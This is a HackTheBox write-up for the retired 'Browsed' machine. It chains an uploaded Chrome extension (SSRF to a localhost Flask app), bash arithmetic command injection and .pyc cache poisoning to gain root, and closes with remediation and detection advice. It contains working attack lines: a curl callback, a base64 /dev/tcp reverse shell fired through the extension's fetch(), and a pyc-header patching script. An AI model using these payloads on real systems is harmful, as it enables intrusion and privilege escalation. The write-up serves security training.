---
title: "HTB: Browsed"
date: 2026-10-03 12:00:00 +0200
categories: [HackTheBox, Medium]
tags: [linux, web, file-upload, chrome-extension, ssrf, command-injection, bash-arithmetic, gitea, reverse-shell, sudo, pyc-cache-poisoning, python]
media_subpath: /assets/img/htb-browsed/
mermaid: true
description: "An uploaded Chrome extension runs server-side and becomes a pivot to a localhost-only Flask app, where a bash arithmetic command injection in routines.sh yields a shell. A world-writable __pycache__ combined with a sudo-run script leads to root via .pyc cache poisoning."
---

![Browsed — HackTheBox](banner.png)

> Published after the machine was retired, in line with HackTheBox content rules.
{: .prompt-info }

## Machine Overview

| Field | Details |
|-------|---------|
| **Name** | Browsed |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Domain** | `browsed.htb` / `browsedinternals.htb` |
| **Key Skills** | Server-side Chrome extension execution, SSRF to localhost, bash arithmetic command injection, `.pyc` cache poisoning |

## Attack Path at a Glance

The web app accepts a Chrome extension upload and **runs it server-side** in a headless Chrome. That browser can reach an internal-only Flask app on `127.0.0.1:5000`, so the extension becomes an SSRF pivot. Source code leaked from an internal Gitea instance shows the Flask route shelling out to `routines.sh`, whose `[[ "$1" -eq 0 ]]` test triggers a **bash arithmetic command injection**. A weaponised extension fires that injection and returns a reverse shell as `larry`. For root, `larry` may `sudo` a Python tool whose `__pycache__` is world-writable — poisoning the cached bytecode of an imported module runs our code as root, which we use to SUID `/bin/bash`.

```mermaid
flowchart TD
    A[Recon: 22, 80] --> B[Web app: upload Chrome extension]
    B --> C[Upload response leaks<br/>browsedinternals.htb]
    C --> D[Internal Gitea<br/>larry/markdownPreview source]
    D --> E[app.py: /routines/&lt;rid&gt; → routines.sh<br/>Flask bound to 127.0.0.1:5000]
    E --> F[routines.sh: &#91;&#91; $1 -eq 0 &#93;&#93;<br/>arithmetic command injection]
    F --> G[Malicious extension fetches<br/>127.0.0.1:5000/routines/x&#91;$&#40;...&#41;&#93;]
    G --> H[Reverse shell as larry → user.txt]
    H --> I[sudo extension_tool.py<br/>world-writable __pycache__]
    I --> J[.pyc cache poisoning of extension_utils]
    J --> K[root payload: chmod +s /bin/bash]
    K --> L[/bin/bash -p → root.txt]
```

## Reconnaissance

### Port Scan

```console
$ nmap 10.129.244.79 -p-
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 10:52 -0500
Nmap scan report for 10.129.244.79
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP. With no credentials, the web app on port 80 is the only way in. The site redirects to `browsed.htb`, so I added it to `/etc/hosts`:

```console
$ echo "10.129.244.79 browsed.htb" | sudo tee -a /etc/hosts
```

## Initial Access

### Web Enumeration — an extension that runs on the server

The site advertises browser extensions (Fontify, ReplaceImages, Timer) and, more interestingly, an **"Upload Your Chrome Extension"** feature, plus a *samples* page hosting a few `.zip` extensions.

I uploaded one of the sample zips to see how the server handled it. The response leaked exactly what happens on the back end:

```text
Running command: timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
  --load-extension="/tmp/extension_6ac10e16194874.12312572" --remote-debugging-port=0 \
  --disable-extensions-except="/tmp/extension_6ac10e16194874.12312572" \
  --enable-logging=stderr --v=1 http://localhost/ http://browsedinternals.htb 2>&1 | tee .../output.log
```

Two key takeaways:
- The server **loads our uploaded extension into a real headless Chrome** and browses with it. Whatever the extension does, runs from the server's perspective.
- That Chrome visits an internal host, **`browsedinternals.htb`**. New target.

```console
$ echo "10.129.244.79 browsed.htb browsedinternals.htb" | sudo tee -a /etc/hosts
```

### Source Disclosure via Internal Gitea

`http://browsedinternals.htb/explore/repos` exposed a Gitea instance with `larry`'s **`markdownPreview`** repo. The README set the scene:

```text
# markdownPreview
This webapp allows us to convert our md files to html. Still in developement, it should only run locally !!!
```

Reading the source revealed the real foothold. `app.py`:

```python
@app.route('/routines/<rid>')
def routines(rid):
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"

# The webapp should only be accessible through localhost
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

The developer deliberately avoided `shell=True` ("NO shell") and bound the app to `127.0.0.1` — believing both made it safe. Neither assumption holds. `routines.sh`:

```bash
log_action() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
}

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  ...
```

### Why `[[ "$1" -eq 0 ]]` is a command injection

`-eq` is an **arithmetic** comparison. When Bash evaluates an arithmetic context, it recursively expands its operands — including **command substitution `$(...)`** — *before* comparing. So an argument like `x[$(command)]` causes Bash to execute `command`. Because `app.py` passes our `rid` straight into `routines.sh` as `$1`, controlling `rid` means arbitrary command execution — no `shell=True` required. The "NO shell" comment is a red herring; the shell injection lives inside the shell script itself.

The remaining problem: the Flask app only listens on `127.0.0.1:5000`. That is where the uploaded extension comes in — it executes inside the server's Chrome, which *can* reach localhost.

### Weaponising the Extension (SSRF → RCE)

I took a sample extension and added a background service worker to reach the internal app. First, a connectivity test to confirm the extension can hit my box and the injection fires:

```json
// manifest.json
{
  "manifest_version": 3,
  "name": "Focus Timer",
  "version": "1.13.0",
  "description": "Simple Pomodoro-style timer to stay focused.",
  "permissions": ["notifications", "background", "webRequest"],
  "background": { "service_worker": "background.js" },
  "action": { "default_popup": "popup.html", "default_title": "Focus Timer" }
}
```

```javascript
// background.js — test callback
fetch("http://127.0.0.1:5000/routines/x[$(curl 10.10.14.152:9001)]");
```

Zipped and uploaded, my listener caught the server-side callback — confirming both the SSRF pivot and the arithmetic injection:

```console
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.152] from (UNKNOWN) [10.129.244.79] 33112
GET / HTTP/1.1
Host: 10.10.14.152:9001
User-Agent: curl/8.5.0
```

Then I swapped the payload for a base64-encoded reverse shell (base64 avoids quoting/character issues inside the arithmetic context):

```console
$ echo -n 'bash -i >& /dev/tcp/10.10.14.152/4444 0>&1' | base64 -w 0
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTUyLzQ0NDQgMD4mMQ==
```

```javascript
// background.js — reverse shell
fetch("http://127.0.0.1:5000/routines/x[$(echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTUyLzQ0NDQgMD4mMQ== | base64 -d | bash)]");
```

```console
$ zip ../test.zip *
$ nc -lvnp 4444
...
larry@browsed:~/markdownPreview$ id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```

### user.txt

```console
larry@browsed:~$ cat user.txt
********************************
```

## Privilege Escalation — `.pyc` Cache Poisoning

### Enumeration

```console
larry@browsed:~$ sudo -l
User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

`extension_tool.py` runs as root and, crucially, **imports a helper module**:

```python
from extension_utils import validate_manifest, clean_temp_files
```

Looking at the directory permissions:

```console
larry@browsed:~$ ls -la /opt/extensiontool/
drwxrwxrwx 2 root root 4096 Dec 11  2025 __pycache__      # world-writable!
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
```

`extension_utils.py` itself isn't writable, but its **`__pycache__` is world-writable (`drwxrwxrwx`)**. That's the whole vulnerability.

### Why poisoning the cache works

When Python imports a module, it checks `__pycache__` for a compiled `.pyc`. With the default **timestamp-based invalidation**, it trusts the cache if the `.pyc` header's stored source *mtime* and *size* match the current `.py`. If they match, Python runs the cached bytecode **without recompiling the source**. So if I can write a `.pyc` whose header matches `extension_utils.py`, root will execute *my* bytecode on next import.

### Exploitation

1. Write a malicious `extension_utils.py` locally whose import side-effect escalates (e.g. make `/bin/bash` SUID), and compile it to `extension_utils.cpython-312.pyc`.
2. Patch the `.pyc` header so its stored mtime/size equal the real source's, taken from:

   ```console
   larry@browsed:~$ stat -c '%Y %s' /opt/extensiontool/extension_utils.py
   1742727379 1245
   ```

   ```python
   import struct
   pyc_path = "/tmp/__pycache__/extension_utils.cpython-312.pyc"
   real_mtime, real_size = 1742727379, 1245
   with open(pyc_path, "rb") as f:
       data = bytearray(f.read())
   # CPython 3.7+ header: magic(4) | flags(4) | mtime(4) | size(4)
   flags = struct.unpack_from("<I", data, 4)[0]
   print("flags:", flags)          # 0 → timestamp-based invalidation
   struct.pack_into("<I", data, 8, real_mtime)
   struct.pack_into("<I", data, 12, real_size)
   with open(pyc_path, "wb") as f:
       f.write(data)
   print("[+] Patched header")
   ```

   `flags: 0` confirms timestamp-based invalidation, so matching mtime/size is enough.

3. Drop the poisoned cache in place and trigger the sudo tool:

   ```console
   larry@browsed:~$ cp /tmp/__pycache__/extension_utils.cpython-312.pyc /opt/extensiontool/__pycache__/
   larry@browsed:~$ sudo /opt/extensiontool/extension_tool.py --ext Timer
   [-] Skipping version bumping
   [-] Skipping packaging
   ```

4. Root imported the poisoned bytecode and ran the payload, leaving `/bin/bash` SUID:

   ```console
   larry@browsed:~$ ls -la /bin/bash
   -rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
   larry@browsed:~$ /bin/bash -p
   bash-5.2# id
   uid=1000(larry) gid=1000(larry) euid=0(root) groups=1000(larry)
   ```

### root.txt

```console
bash-5.2# cat /root/root.txt
********************************
```

Rooted. 🏁

## Defender's View

| # | Finding | Severity | Remediation |
|---|---------|----------|-------------|
| 1 | Uploaded Chrome extensions executed server-side | Critical | Never load untrusted extensions; if required, sandbox with no network to internal hosts |
| 2 | Bash arithmetic command injection in `routines.sh` (`[[ "$1" -eq 0 ]]`) | Critical | Validate input against an allow-list of numeric IDs before use; use `case` with fixed values; avoid arithmetic tests on untrusted data |
| 3 | "localhost-only" Flask app reachable via server-side browser (SSRF) | High | Don't treat localhost origin as trusted; add authentication; isolate the headless browser network |
| 4 | Internal Gitea leaks source and internal hostname | Medium | Restrict repo visibility; don't expose internal infra/hostnames in responses |
| 5 | World-writable `__pycache__` on a root-run tool | Critical | Remove world-write (`chmod 755`); ensure sudo-run code and its import path aren't user-writable |
| 6 | `sudo NOPASSWD` on a script importing writable modules | High | Scope sudo narrowly; run from a root-owned, non-writable directory; set `secure_path` |

### MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Data from Information Repositories (Gitea source) | T1213 |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Privilege Escalation | Hijack Execution Flow (poisoned `.pyc`) | T1574 |

### Detection Ideas

- Alert when the upload/Chrome process spawns unexpected children (`bash`, `curl`, outbound connections).
- Log and review `routines.sh` invocations with non-numeric arguments.
- File-integrity monitoring on `/opt/extensiontool/__pycache__/` and on the SUID bit of `/bin/bash`.
- Flag any `.pyc` whose stored mtime/size was hand-edited to match its source.

## Lessons Learned

- **"No shell" ≠ no injection.** `subprocess.run([...])` avoids the Python shell, but the called script reintroduced one through a bash arithmetic test.
- **Bash arithmetic contexts evaluate command substitution** — `[[ $x -eq 0 ]]` on attacker input is RCE, not just a comparison.
- A **localhost bind is not an authz boundary** when something trusted (a server-side browser) can reach it; the extension upload turned into a clean SSRF pivot.
- **Timestamp-based `.pyc` invalidation + a writable `__pycache__`** is a reliable root primitive when the source runs under sudo — you never need to touch the `.py` itself.

## References

- [Bash manual — Conditional constructs & arithmetic evaluation](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic) — how `-eq` expands operands
- [PEP 552 — Deterministic pycs](https://peps.python.org/pep-0552/) — `.pyc` header and timestamp invalidation
- [Chrome Extensions MV3 — service workers](https://developer.chrome.com/docs/extensions/mv3/service_workers/) — background execution model
